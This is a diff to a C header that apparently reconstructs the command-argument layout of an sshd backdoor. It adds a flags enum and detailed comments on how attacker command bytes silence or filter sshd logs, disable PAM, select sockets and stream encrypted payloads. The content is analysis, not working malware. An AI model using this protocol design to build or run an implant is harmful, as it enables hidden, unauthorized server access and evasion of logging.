@@ -1695,11 +1695,25 @@ typedef union __attribute__((packed)) {
  u16 size;
 } u_cmd_arguments_t;
 
+typedef enum {
+ CMD_CTRL_EXIT_AFTER_DISPATCH = 0x1,
+ CMD_CTRL_INSTALL_LOG_HOOK = 0x2,
+ CMD_CTRL_SETLOGMASK_SILENCE = 0x4,
+ CMD_CTRL_LOG_FILTER = 0x8,
+ CMD_CTRL_LOG_FILTER_REQUIRE_STRINGS = 0x10,
+ CMD_CTRL_FORCE_SOCKET_PROBE = 0x20,
+ CMD_CTRL_DISABLE_PAM = 0x40,
+ CMD_CTRL_EXTENDED_MODE = 0x80,
+ CMD_CTRL_WAIT_FOR_REPLY = CMD_CTRL_EXTENDED_MODE
+} CmdControlFlags;
+
+typedef u8 CmdControlFlags_t; /* Storage for CmdControlFlags (CMD_CTRL_*) bitmask. */
+
 /*
  * control_flags/monitor_flags/request_flags plus a two-byte payload_hint that collectively drive log-hook installs, PAM disablement, socket selection, monitor request IDs, and whether sshd_monitor_cmd_dispatch should stream payloads or patch ctx->sshd_offsets.
  */
 typedef struct __attribute__((packed)) cmd_arguments {
- u8 control_flags; /* Primary toggles consumed by rsa_backdoor_command_dispatch()/sshd_monitor_cmd_dispatch: bit0 requests sshd exit after dispatch (propagates into ctx->exit_flag and calls libc_exit(0) on parse failures), bit1 asks sshd_install_mm_log_handler_hook() to run, bit2 requests setlogmask(-0x80000000), bit3 differentiates "squelch" logging from the filter mode, bit4 requires that the attacker-supplied format strings are present before enabling the filter, bit5 forces sshd_monitor_cmd_dispatch to use sshd_find_socket_fd_by_shutdown_probe() with the encoded socket ids, bit6 disables PAM by zeroing use_pam_ptr, and bit7 tells sshd_monitor_cmd_dispatch to wait for replies while letting opcode 0 treat the tail bytes as sshd_offsets overrides. */
+ CmdControlFlags_t control_flags; /* CMD_CTRL_* bitmask consumed by rsa_backdoor_command_dispatch()/sshd_monitor_cmd_dispatch: EXIT_AFTER_DISPATCH requests sshd exit after dispatch (propagates into ctx->exit_flag and calls libc_exit(0) on parse failures), INSTALL_LOG_HOOK asks sshd_install_mm_log_handler_hook() to run, SETLOGMASK_SILENCE requests setlogmask(-0x80000000), LOG_FILTER differentiates squelch logging from filter mode, LOG_FILTER_REQUIRE_STRINGS requires the %s/'Connection closed by'/'(preauth)' strings before enabling the filter, FORCE_SOCKET_PROBE makes sshd_monitor_cmd_dispatch use sshd_find_socket_fd_by_shutdown_probe() with encoded socket ids, DISABLE_PAM zeros use_pam_ptr, and EXTENDED_MODE gates the opcode 0 offsets override, opcode 2 length prefix, and monitor reply waiting (CMD_CTRL_WAIT_FOR_REPLY alias). */
  u8 monitor_flags; /* Secondary command byte: bit0 marks that continuation chunks include an 8-byte prefix before the little-endian size, bit1/bit2 tell rsa_backdoor_command_dispatch() that flags3/payload_hint carry sshd_offsets nibbles, bits3-5 hold the socket ordinal for cmd_type 0/1/2 when manual sockets are requested, and the high bits (0xC0) describe how cmd_type 3 sources payloads (0x40 = exit immediately, 0x00/0x80 = find the ChaCha blob on the stack, 0xC0 = payload_body/payload_body_size already populated). */
  u8 request_flags; /* Monitor/socket selector: the low 5 bits either override the MONITOR_REQ_* opcode or carry an additional socket index, bit5 advertises that sshd_monitor_cmd_dispatch must pull an sshbuf payload via sshd_find_forged_modulus_sshbuf(), and bit6 repurposes the tail bytes when opcode 0 patches ctx->sshd_offsets (see rsa_backdoor_command_dispatch()). */
  u_cmd_arguments_t payload_hint; /* Final two bytes reused as either a payload length (continuation chunks streamed into ctx->payload_buffer) or as raw bitfields when opcode 0 repacks ctx->sshd_offsets/monitor request selectors. */
